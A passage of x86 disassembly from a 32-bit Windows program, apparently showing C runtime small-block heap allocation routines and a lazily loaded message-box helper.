  405288:	d3 eb                	shr    %cl,%ebx
  40528a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40528d:	09 59 04             	or     %ebx,0x4(%ecx)
  405290:	8d 4f e0             	lea    -0x20(%edi),%ecx
  405293:	bf 00 00 00 80       	mov    $0x80000000,%edi
  405298:	d3 ef                	shr    %cl,%edi
  40529a:	8d 84 b0 c4 00 00 00 	lea    0xc4(%eax,%esi,4),%eax
  4052a1:	09 38                	or     %edi,(%eax)
  4052a3:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  4052a6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4052a9:	89 1a                	mov    %ebx,(%edx)
  4052ab:	89 5c 13 fc          	mov    %ebx,-0x4(%ebx,%edx,1)
  4052af:	ff 08                	decl   (%eax)
  4052b1:	0f 85 fa 00 00 00    	jne    0x4053b1
  4052b7:	a1 64 99 40 00       	mov    0x409964,%eax
  4052bc:	85 c0                	test   %eax,%eax
  4052be:	0f 84 df 00 00 00    	je     0x4053a3
  4052c4:	8b 0d 5c 99 40 00    	mov    0x40995c,%ecx
  4052ca:	8b 3d d4 70 40 00    	mov    0x4070d4,%edi
  4052d0:	c1 e1 0f             	shl    $0xf,%ecx
  4052d3:	03 48 0c             	add    0xc(%eax),%ecx
  4052d6:	bb 00 80 00 00       	mov    $0x8000,%ebx
  4052db:	68 00 40 00 00       	push   $0x4000
  4052e0:	53                   	push   %ebx
  4052e1:	51                   	push   %ecx
  4052e2:	ff d7                	call   *%edi
  4052e4:	8b 0d 5c 99 40 00    	mov    0x40995c,%ecx
  4052ea:	a1 64 99 40 00       	mov    0x409964,%eax
  4052ef:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4052f4:	d3 ea                	shr    %cl,%edx
  4052f6:	09 50 08             	or     %edx,0x8(%eax)
  4052f9:	a1 64 99 40 00       	mov    0x409964,%eax
  4052fe:	8b 0d 5c 99 40 00    	mov    0x40995c,%ecx
  405304:	8b 40 10             	mov    0x10(%eax),%eax
  405307:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  40530e:	00 
  40530f:	a1 64 99 40 00       	mov    0x409964,%eax
  405314:	8b 40 10             	mov    0x10(%eax),%eax
  405317:	fe 48 43             	decb   0x43(%eax)
  40531a:	a1 64 99 40 00       	mov    0x409964,%eax
  40531f:	8b 48 10             	mov    0x10(%eax),%ecx
  405322:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  405326:	75 09                	jne    0x405331
  405328:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  40532c:	a1 64 99 40 00       	mov    0x409964,%eax
  405331:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  405335:	75 6c                	jne    0x4053a3
  405337:	53                   	push   %ebx
  405338:	6a 00                	push   $0x0
  40533a:	ff 70 0c             	push   0xc(%eax)
  40533d:	ff d7                	call   *%edi
  40533f:	a1 64 99 40 00       	mov    0x409964,%eax
  405344:	ff 70 10             	push   0x10(%eax)
  405347:	6a 00                	push   $0x0
  405349:	ff 35 a8 9b 40 00    	push   0x409ba8
  40534f:	ff 15 6c 70 40 00    	call   *0x40706c
  405355:	a1 68 99 40 00       	mov    0x409968,%eax
  40535a:	8b 15 6c 99 40 00    	mov    0x40996c,%edx
  405360:	8d 04 80             	lea    (%eax,%eax,4),%eax
  405363:	c1 e0 02             	shl    $0x2,%eax
  405366:	8b c8                	mov    %eax,%ecx
  405368:	a1 64 99 40 00       	mov    0x409964,%eax
  40536d:	2b c8                	sub    %eax,%ecx
  40536f:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  405373:	51                   	push   %ecx
  405374:	8d 48 14             	lea    0x14(%eax),%ecx
  405377:	51                   	push   %ecx
  405378:	50                   	push   %eax
  405379:	e8 a2 0a 00 00       	call   0x405e20
  40537e:	8b 45 08             	mov    0x8(%ebp),%eax
  405381:	83 c4 0c             	add    $0xc,%esp
  405384:	ff 0d 68 99 40 00    	decl   0x409968
  40538a:	3b 05 64 99 40 00    	cmp    0x409964,%eax
  405390:	76 03                	jbe    0x405395
  405392:	83 e8 14             	sub    $0x14,%eax
  405395:	8b 0d 6c 99 40 00    	mov    0x40996c,%ecx
  40539b:	89 0d 60 99 40 00    	mov    %ecx,0x409960
  4053a1:	eb 03                	jmp    0x4053a6
  4053a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4053a6:	a3 64 99 40 00       	mov    %eax,0x409964
  4053ab:	89 35 5c 99 40 00    	mov    %esi,0x40995c
  4053b1:	5f                   	pop    %edi
  4053b2:	5e                   	pop    %esi
  4053b3:	5b                   	pop    %ebx
  4053b4:	c9                   	leave
  4053b5:	c3                   	ret
  4053b6:	55                   	push   %ebp
  4053b7:	8b ec                	mov    %esp,%ebp
  4053b9:	83 ec 14             	sub    $0x14,%esp
  4053bc:	a1 68 99 40 00       	mov    0x409968,%eax
  4053c1:	8b 15 6c 99 40 00    	mov    0x40996c,%edx
  4053c7:	53                   	push   %ebx
  4053c8:	56                   	push   %esi
  4053c9:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4053cc:	57                   	push   %edi
  4053cd:	8d 3c 82             	lea    (%edx,%eax,4),%edi
  4053d0:	8b 45 08             	mov    0x8(%ebp),%eax
  4053d3:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4053d6:	8d 48 17             	lea    0x17(%eax),%ecx
  4053d9:	83 e1 f0             	and    $0xfffffff0,%ecx
  4053dc:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4053df:	c1 f9 04             	sar    $0x4,%ecx
  4053e2:	49                   	dec    %ecx
  4053e3:	83 f9 20             	cmp    $0x20,%ecx
  4053e6:	7d 0e                	jge    0x4053f6
  4053e8:	83 ce ff             	or     $0xffffffff,%esi
  4053eb:	d3 ee                	shr    %cl,%esi
  4053ed:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  4053f1:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4053f4:	eb 10                	jmp    0x405406
  4053f6:	83 c1 e0             	add    $0xffffffe0,%ecx
  4053f9:	83 c8 ff             	or     $0xffffffff,%eax
  4053fc:	33 f6                	xor    %esi,%esi
  4053fe:	d3 e8                	shr    %cl,%eax
  405400:	89 75 f4             	mov    %esi,-0xc(%ebp)
  405403:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405406:	a1 60 99 40 00       	mov    0x409960,%eax
  40540b:	8b d8                	mov    %eax,%ebx
  40540d:	3b df                	cmp    %edi,%ebx
  40540f:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405412:	73 19                	jae    0x40542d
  405414:	8b 4b 04             	mov    0x4(%ebx),%ecx
  405417:	8b 3b                	mov    (%ebx),%edi
  405419:	23 4d f8             	and    -0x8(%ebp),%ecx
  40541c:	23 fe                	and    %esi,%edi
  40541e:	0b cf                	or     %edi,%ecx
  405420:	75 0b                	jne    0x40542d
  405422:	83 c3 14             	add    $0x14,%ebx
  405425:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  405428:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40542b:	72 e7                	jb     0x405414
  40542d:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  405430:	75 79                	jne    0x4054ab
  405432:	8b da                	mov    %edx,%ebx
  405434:	3b d8                	cmp    %eax,%ebx
  405436:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405439:	73 15                	jae    0x405450
  40543b:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40543e:	8b 3b                	mov    (%ebx),%edi
  405440:	23 4d f8             	and    -0x8(%ebp),%ecx
  405443:	23 fe                	and    %esi,%edi
  405445:	0b cf                	or     %edi,%ecx
  405447:	75 05                	jne    0x40544e
  405449:	83 c3 14             	add    $0x14,%ebx
  40544c:	eb e6                	jmp    0x405434
  40544e:	3b d8                	cmp    %eax,%ebx
  405450:	75 59                	jne    0x4054ab
  405452:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  405455:	73 11                	jae    0x405468
  405457:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  40545b:	75 08                	jne    0x405465
  40545d:	83 c3 14             	add    $0x14,%ebx
  405460:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405463:	eb ed                	jmp    0x405452
  405465:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  405468:	75 26                	jne    0x405490
  40546a:	8b da                	mov    %edx,%ebx
  40546c:	3b d8                	cmp    %eax,%ebx
  40546e:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405471:	73 0d                	jae    0x405480
  405473:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  405477:	75 05                	jne    0x40547e
  405479:	83 c3 14             	add    $0x14,%ebx
  40547c:	eb ee                	jmp    0x40546c
  40547e:	3b d8                	cmp    %eax,%ebx
  405480:	75 0e                	jne    0x405490
  405482:	e8 38 02 00 00       	call   0x4056bf
  405487:	8b d8                	mov    %eax,%ebx
  405489:	85 db                	test   %ebx,%ebx
  40548b:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40548e:	74 14                	je     0x4054a4
  405490:	53                   	push   %ebx
  405491:	e8 da 02 00 00       	call   0x405770
  405496:	59                   	pop    %ecx
  405497:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40549a:	89 01                	mov    %eax,(%ecx)
  40549c:	8b 43 10             	mov    0x10(%ebx),%eax
  40549f:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  4054a2:	75 07                	jne    0x4054ab
  4054a4:	33 c0                	xor    %eax,%eax
  4054a6:	e9 0f 02 00 00       	jmp    0x4056ba
  4054ab:	89 1d 60 99 40 00    	mov    %ebx,0x409960
  4054b1:	8b 43 10             	mov    0x10(%ebx),%eax
  4054b4:	8b 10                	mov    (%eax),%edx
  4054b6:	83 fa ff             	cmp    $0xffffffff,%edx
  4054b9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4054bc:	74 14                	je     0x4054d2
  4054be:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  4054c5:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  4054c9:	23 4d f8             	and    -0x8(%ebp),%ecx
  4054cc:	23 fe                	and    %esi,%edi
  4054ce:	0b cf                	or     %edi,%ecx
  4054d0:	75 37                	jne    0x405509
  4054d2:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  4054d8:	8b 70 44             	mov    0x44(%eax),%esi
  4054db:	23 55 f8             	and    -0x8(%ebp),%edx
  4054de:	23 75 f4             	and    -0xc(%ebp),%esi
  4054e1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4054e5:	8d 48 44             	lea    0x44(%eax),%ecx
  4054e8:	0b d6                	or     %esi,%edx
  4054ea:	8b 75 f4             	mov    -0xc(%ebp),%esi
  4054ed:	75 17                	jne    0x405506
  4054ef:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  4054f5:	ff 45 fc             	incl   -0x4(%ebp)
  4054f8:	23 55 f8             	and    -0x8(%ebp),%edx
  4054fb:	83 c1 04             	add    $0x4,%ecx
  4054fe:	8b fe                	mov    %esi,%edi
  405500:	23 39                	and    (%ecx),%edi
  405502:	0b d7                	or     %edi,%edx
  405504:	74 e9                	je     0x4054ef
  405506:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405509:	8b ca                	mov    %edx,%ecx
  40550b:	33 ff                	xor    %edi,%edi
  40550d:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  405513:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  40551a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40551d:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  405521:	23 ce                	and    %esi,%ecx
  405523:	75 0d                	jne    0x405532
  405525:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  40552c:	6a 20                	push   $0x20
  40552e:	23 4d f8             	and    -0x8(%ebp),%ecx
  405531:	5f                   	pop    %edi
  405532:	85 c9                	test   %ecx,%ecx
  405534:	7c 05                	jl     0x40553b
  405536:	d1 e1                	shl    $1,%ecx
  405538:	47                   	inc    %edi
  405539:	eb f7                	jmp    0x405532
  40553b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40553e:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  405542:	8b 0a                	mov    (%edx),%ecx
  405544:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  405547:	8b f1                	mov    %ecx,%esi
  405549:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40554c:	c1 fe 04             	sar    $0x4,%esi
  40554f:	4e                   	dec    %esi
  405550:	83 fe 3f             	cmp    $0x3f,%esi
  405553:	7e 03                	jle    0x405558
  405555:	6a 3f                	push   $0x3f
  405557:	5e                   	pop    %esi
  405558:	3b f7                	cmp    %edi,%esi
  40555a:	0f 84 0d 01 00 00    	je     0x40566d
  405560:	8b 4a 04             	mov    0x4(%edx),%ecx
  405563:	3b 4a 08             	cmp    0x8(%edx),%ecx
  405566:	75 61                	jne    0x4055c9
  405568:	83 ff 20             	cmp    $0x20,%edi
  40556b:	7d 2b                	jge    0x405598
  40556d:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  405572:	8b cf                	mov    %edi,%ecx
  405574:	d3 eb                	shr    %cl,%ebx
  405576:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405579:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  40557d:	f7 d3                	not    %ebx
  40557f:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405582:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  405586:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  40558a:	fe 0f                	decb   (%edi)
  40558c:	75 38                	jne    0x4055c6
  40558e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405591:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405594:	21 0b                	and    %ecx,(%ebx)
  405596:	eb 31                	jmp    0x4055c9
  405598:	8d 4f e0             	lea    -0x20(%edi),%ecx
  40559b:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4055a0:	d3 eb                	shr    %cl,%ebx
  4055a2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4055a5:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  4055a9:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  4055b0:	f7 d3                	not    %ebx
  4055b2:	21 19                	and    %ebx,(%ecx)
  4055b4:	fe 0f                	decb   (%edi)
  4055b6:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4055b9:	75 0b                	jne    0x4055c6
  4055bb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4055be:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4055c1:	21 4b 04             	and    %ecx,0x4(%ebx)
  4055c4:	eb 03                	jmp    0x4055c9
  4055c6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4055c9:	8b 4a 08             	mov    0x8(%edx),%ecx
  4055cc:	8b 7a 04             	mov    0x4(%edx),%edi
  4055cf:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4055d3:	89 79 04             	mov    %edi,0x4(%ecx)
  4055d6:	8b 4a 04             	mov    0x4(%edx),%ecx
  4055d9:	8b 7a 08             	mov    0x8(%edx),%edi
  4055dc:	89 79 08             	mov    %edi,0x8(%ecx)
  4055df:	0f 84 94 00 00 00    	je     0x405679
  4055e5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4055e8:	8b 7c f1 04          	mov    0x4(%ecx,%esi,8),%edi
  4055ec:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  4055ef:	89 7a 04             	mov    %edi,0x4(%edx)
  4055f2:	89 4a 08             	mov    %ecx,0x8(%edx)
  4055f5:	89 51 04             	mov    %edx,0x4(%ecx)
  4055f8:	8b 4a 04             	mov    0x4(%edx),%ecx
  4055fb:	89 51 08             	mov    %edx,0x8(%ecx)
  4055fe:	8b 4a 04             	mov    0x4(%edx),%ecx
  405601:	3b 4a 08             	cmp    0x8(%edx),%ecx
  405604:	75 64                	jne    0x40566a
  405606:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  40560a:	83 fe 20             	cmp    $0x20,%esi
  40560d:	88 4d 0b             	mov    %cl,0xb(%ebp)
  405610:	7d 29                	jge    0x40563b
  405612:	fe c1                	inc    %cl
  405614:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  405618:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  40561c:	75 0b                	jne    0x405629
  40561e:	bf 00 00 00 80       	mov    $0x80000000,%edi
  405623:	8b ce                	mov    %esi,%ecx
  405625:	d3 ef                	shr    %cl,%edi
  405627:	09 3b                	or     %edi,(%ebx)
  405629:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40562e:	8b ce                	mov    %esi,%ecx
  405630:	d3 ef                	shr    %cl,%edi
  405632:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405635:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  405639:	eb 2f                	jmp    0x40566a
  40563b:	fe c1                	inc    %cl
  40563d:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  405641:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  405645:	75 0d                	jne    0x405654
  405647:	8d 4e e0             	lea    -0x20(%esi),%ecx
  40564a:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40564f:	d3 ef                	shr    %cl,%edi
  405651:	09 7b 04             	or     %edi,0x4(%ebx)
  405654:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405657:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  40565e:	8d 4e e0             	lea    -0x20(%esi),%ecx
  405661:	be 00 00 00 80       	mov    $0x80000000,%esi
  405666:	d3 ee                	shr    %cl,%esi
  405668:	09 37                	or     %esi,(%edi)
  40566a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40566d:	85 c9                	test   %ecx,%ecx
  40566f:	74 0b                	je     0x40567c
  405671:	89 0a                	mov    %ecx,(%edx)
  405673:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  405677:	eb 03                	jmp    0x40567c
  405679:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40567c:	8b 75 f0             	mov    -0x10(%ebp),%esi
  40567f:	03 d1                	add    %ecx,%edx
  405681:	8d 4e 01             	lea    0x1(%esi),%ecx
  405684:	89 0a                	mov    %ecx,(%edx)
  405686:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  40568a:	8b 75 f4             	mov    -0xc(%ebp),%esi
  40568d:	8b 0e                	mov    (%esi),%ecx
  40568f:	85 c9                	test   %ecx,%ecx
  405691:	8d 79 01             	lea    0x1(%ecx),%edi
  405694:	89 3e                	mov    %edi,(%esi)
  405696:	75 1a                	jne    0x4056b2
  405698:	3b 1d 64 99 40 00    	cmp    0x409964,%ebx
  40569e:	75 12                	jne    0x4056b2
  4056a0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056a3:	3b 0d 5c 99 40 00    	cmp    0x40995c,%ecx
  4056a9:	75 07                	jne    0x4056b2
  4056ab:	83 25 64 99 40 00 00 	andl   $0x0,0x409964
  4056b2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056b5:	89 08                	mov    %ecx,(%eax)
  4056b7:	8d 42 04             	lea    0x4(%edx),%eax
  4056ba:	5f                   	pop    %edi
  4056bb:	5e                   	pop    %esi
  4056bc:	5b                   	pop    %ebx
  4056bd:	c9                   	leave
  4056be:	c3                   	ret
  4056bf:	a1 68 99 40 00       	mov    0x409968,%eax
  4056c4:	8b 0d 58 99 40 00    	mov    0x409958,%ecx
  4056ca:	56                   	push   %esi
  4056cb:	57                   	push   %edi
  4056cc:	33 ff                	xor    %edi,%edi
  4056ce:	3b c1                	cmp    %ecx,%eax
  4056d0:	75 30                	jne    0x405702
  4056d2:	8d 44 89 50          	lea    0x50(%ecx,%ecx,4),%eax
  4056d6:	c1 e0 02             	shl    $0x2,%eax
  4056d9:	50                   	push   %eax
  4056da:	ff 35 6c 99 40 00    	push   0x40996c
  4056e0:	57                   	push   %edi
  4056e1:	ff 35 a8 9b 40 00    	push   0x409ba8
  4056e7:	ff 15 b0 70 40 00    	call   *0x4070b0
  4056ed:	3b c7                	cmp    %edi,%eax
  4056ef:	74 61                	je     0x405752
  4056f1:	83 05 58 99 40 00 10 	addl   $0x10,0x409958
  4056f8:	a3 6c 99 40 00       	mov    %eax,0x40996c
  4056fd:	a1 68 99 40 00       	mov    0x409968,%eax
  405702:	8b 0d 6c 99 40 00    	mov    0x40996c,%ecx
  405708:	68 c4 41 00 00       	push   $0x41c4
  40570d:	6a 08                	push   $0x8
  40570f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  405712:	ff 35 a8 9b 40 00    	push   0x409ba8
  405718:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  40571b:	ff 15 94 70 40 00    	call   *0x407094
  405721:	3b c7                	cmp    %edi,%eax
  405723:	89 46 10             	mov    %eax,0x10(%esi)
  405726:	74 2a                	je     0x405752
  405728:	6a 04                	push   $0x4
  40572a:	68 00 20 00 00       	push   $0x2000
  40572f:	68 00 00 10 00       	push   $0x100000
  405734:	57                   	push   %edi
  405735:	ff 15 b4 70 40 00    	call   *0x4070b4
  40573b:	3b c7                	cmp    %edi,%eax
  40573d:	89 46 0c             	mov    %eax,0xc(%esi)
  405740:	75 14                	jne    0x405756
  405742:	ff 76 10             	push   0x10(%esi)
  405745:	57                   	push   %edi
  405746:	ff 35 a8 9b 40 00    	push   0x409ba8
  40574c:	ff 15 6c 70 40 00    	call   *0x40706c
  405752:	33 c0                	xor    %eax,%eax
  405754:	eb 17                	jmp    0x40576d
  405756:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  40575a:	89 3e                	mov    %edi,(%esi)
  40575c:	89 7e 04             	mov    %edi,0x4(%esi)
  40575f:	ff 05 68 99 40 00    	incl   0x409968
  405765:	8b 46 10             	mov    0x10(%esi),%eax
  405768:	83 08 ff             	orl    $0xffffffff,(%eax)
  40576b:	8b c6                	mov    %esi,%eax
  40576d:	5f                   	pop    %edi
  40576e:	5e                   	pop    %esi
  40576f:	c3                   	ret
  405770:	55                   	push   %ebp
  405771:	8b ec                	mov    %esp,%ebp
  405773:	51                   	push   %ecx
  405774:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405777:	53                   	push   %ebx
  405778:	56                   	push   %esi
  405779:	57                   	push   %edi
  40577a:	8b 71 10             	mov    0x10(%ecx),%esi
  40577d:	8b 41 08             	mov    0x8(%ecx),%eax
  405780:	33 db                	xor    %ebx,%ebx
  405782:	85 c0                	test   %eax,%eax
  405784:	7c 05                	jl     0x40578b
  405786:	d1 e0                	shl    $1,%eax
  405788:	43                   	inc    %ebx
  405789:	eb f7                	jmp    0x405782
  40578b:	8b c3                	mov    %ebx,%eax
  40578d:	6a 3f                	push   $0x3f
  40578f:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  405795:	5a                   	pop    %edx
  405796:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  40579d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4057a0:	89 40 08             	mov    %eax,0x8(%eax)
  4057a3:	89 40 04             	mov    %eax,0x4(%eax)
  4057a6:	83 c0 08             	add    $0x8,%eax
  4057a9:	4a                   	dec    %edx
  4057aa:	75 f4                	jne    0x4057a0
  4057ac:	8b fb                	mov    %ebx,%edi
  4057ae:	6a 04                	push   $0x4
  4057b0:	c1 e7 0f             	shl    $0xf,%edi
  4057b3:	03 79 0c             	add    0xc(%ecx),%edi
  4057b6:	68 00 10 00 00       	push   $0x1000
  4057bb:	68 00 80 00 00       	push   $0x8000
  4057c0:	57                   	push   %edi
  4057c1:	ff 15 b4 70 40 00    	call   *0x4070b4
  4057c7:	85 c0                	test   %eax,%eax
  4057c9:	75 08                	jne    0x4057d3
  4057cb:	83 c8 ff             	or     $0xffffffff,%eax
  4057ce:	e9 93 00 00 00       	jmp    0x405866
  4057d3:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  4057d9:	3b fa                	cmp    %edx,%edi
  4057db:	77 3c                	ja     0x405819
  4057dd:	8d 47 10             	lea    0x10(%edi),%eax
  4057e0:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  4057e4:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  4057eb:	8d 88 fc 0f 00 00    	lea    0xffc(%eax),%ecx
  4057f1:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  4057f8:	89 08                	mov    %ecx,(%eax)
  4057fa:	8d 88 fc ef ff ff    	lea    -0x1004(%eax),%ecx
  405800:	89 48 04             	mov    %ecx,0x4(%eax)
  405803:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  40580a:	0f 00 00 
  40580d:	05 00 10 00 00       	add    $0x1000,%eax
  405812:	8d 48 f0             	lea    -0x10(%eax),%ecx
  405815:	3b ca                	cmp    %edx,%ecx
  405817:	76 c7                	jbe    0x4057e0
  405819:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40581c:	8d 4f 0c             	lea    0xc(%edi),%ecx
  40581f:	05 f8 01 00 00       	add    $0x1f8,%eax
  405824:	6a 01                	push   $0x1
  405826:	5f                   	pop    %edi
  405827:	89 48 04             	mov    %ecx,0x4(%eax)
  40582a:	89 41 08             	mov    %eax,0x8(%ecx)
  40582d:	8d 4a 0c             	lea    0xc(%edx),%ecx
  405830:	89 48 08             	mov    %ecx,0x8(%eax)
  405833:	89 41 04             	mov    %eax,0x4(%ecx)
  405836:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  40583b:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  405842:	8a 46 43             	mov    0x43(%esi),%al
  405845:	8a c8                	mov    %al,%cl
  405847:	fe c1                	inc    %cl
  405849:	84 c0                	test   %al,%al
  40584b:	8b 45 08             	mov    0x8(%ebp),%eax
  40584e:	88 4e 43             	mov    %cl,0x43(%esi)
  405851:	75 03                	jne    0x405856
  405853:	09 78 04             	or     %edi,0x4(%eax)
  405856:	ba 00 00 00 80       	mov    $0x80000000,%edx
  40585b:	8b cb                	mov    %ebx,%ecx
  40585d:	d3 ea                	shr    %cl,%edx
  40585f:	f7 d2                	not    %edx
  405861:	21 50 08             	and    %edx,0x8(%eax)
  405864:	8b c3                	mov    %ebx,%eax
  405866:	5f                   	pop    %edi
  405867:	5e                   	pop    %esi
  405868:	5b                   	pop    %ebx
  405869:	c9                   	leave
  40586a:	c3                   	ret
  40586b:	53                   	push   %ebx
  40586c:	33 db                	xor    %ebx,%ebx
  40586e:	39 1d 1c 99 40 00    	cmp    %ebx,0x40991c
  405874:	56                   	push   %esi
  405875:	57                   	push   %edi
  405876:	75 42                	jne    0x4058ba
  405878:	68 c8 74 40 00       	push   $0x4074c8
  40587d:	ff 15 58 70 40 00    	call   *0x407058
  405883:	8b f8                	mov    %eax,%edi
  405885:	3b fb                	cmp    %ebx,%edi
  405887:	74 67                	je     0x4058f0
  405889:	8b 35 a0 70 40 00    	mov    0x4070a0,%esi
  40588f:	68 bc 74 40 00       	push   $0x4074bc
  405894:	57                   	push   %edi
  405895:	ff d6                	call   *%esi
  405897:	85 c0                	test   %eax,%eax
  405899:	a3 1c 99 40 00       	mov    %eax,0x40991c
  40589e:	74 50                	je     0x4058f0
  4058a0:	68 ac 74 40 00       	push   $0x4074ac
  4058a5:	57                   	push   %edi
  4058a6:	ff d6                	call   *%esi
  4058a8:	68 98 74 40 00       	push   $0x407498
  4058ad:	57                   	push   %edi
  4058ae:	a3 20 99 40 00       	mov    %eax,0x409920
  4058b3:	ff d6                	call   *%esi
  4058b5:	a3 24 99 40 00       	mov    %eax,0x409924
  4058ba:	a1 20 99 40 00       	mov    0x409920,%eax
  4058bf:	85 c0                	test   %eax,%eax
  4058c1:	74 16                	je     0x4058d9
  4058c3:	ff d0                	call   *%eax
  4058c5:	8b d8                	mov    %eax,%ebx
  4058c7:	85 db                	test   %ebx,%ebx
  4058c9:	74 0e                	je     0x4058d9
  4058cb:	a1 24 99 40 00       	mov    0x409924,%eax
  4058d0:	85 c0                	test   %eax,%eax
  4058d2:	74 05                	je     0x4058d9
  4058d4:	53                   	push   %ebx
  4058d5:	ff d0                	call   *%eax
  4058d7:	8b d8                	mov    %eax,%ebx
  4058d9:	ff 74 24 18          	push   0x18(%esp)
  4058dd:	ff 74 24 18          	push   0x18(%esp)
  4058e1:	ff 74 24 18          	push   0x18(%esp)
  4058e5:	53                   	push   %ebx
  4058e6:	ff 15 1c 99 40 00    	call   *0x40991c
  4058ec:	5f                   	pop    %edi
  4058ed:	5e                   	pop    %esi
  4058ee:	5b                   	pop    %ebx
  4058ef:	c3                   	ret
  4058f0:	33 c0                	xor    %eax,%eax
  4058f2:	eb f8                	jmp    0x4058ec
  4058f4:	cc                   	int3
  4058f5:	cc                   	int3
  4058f6:	cc                   	int3
  4058f7:	cc                   	int3
  4058f8:	cc                   	int3
  4058f9:	cc                   	int3
  4058fa:	cc                   	int3
  4058fb:	cc                   	int3
  4058fc:	cc                   	int3
  4058fd:	cc                   	int3
  4058fe:	cc                   	int3
  4058ff:	cc                   	int3
  405900:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405904:	57                   	push   %edi
  405905:	85 c9                	test   %ecx,%ecx
